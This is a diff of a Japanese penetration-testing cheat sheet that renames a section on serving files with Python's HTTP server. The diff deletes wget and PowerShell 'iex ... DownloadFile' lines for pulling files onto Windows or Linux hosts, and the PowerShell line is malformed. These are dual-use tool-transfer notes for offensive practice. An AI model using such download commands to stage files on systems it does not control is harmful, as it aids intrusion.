@@ -11,10 +11,7 @@ sudo su - # rootシェル
 sudo -i # rootシェル
 ```
 
-## 任意のファイルをHTTP経由でダウンロードさせる(kali linuxでpython3を使用)
+## 任意のファイルをHTTP経由で配布(python3を使用)
 ```bash
 python3 -m http.server 8000 # 任意のファイルがあるディレクトリで実行
-wget <URL> -O <ダウンロード先のパスと保存名> # windowsからダウンロード
-iex (New-Object Net.WebClient).DownloadFile('<URL>') -O <ダウンロード先のパスと保存名> # windowsからダウンロード
-wget <URL> -O <ダウンロード先のパスと保存名> # linux からダウンロード
 ```
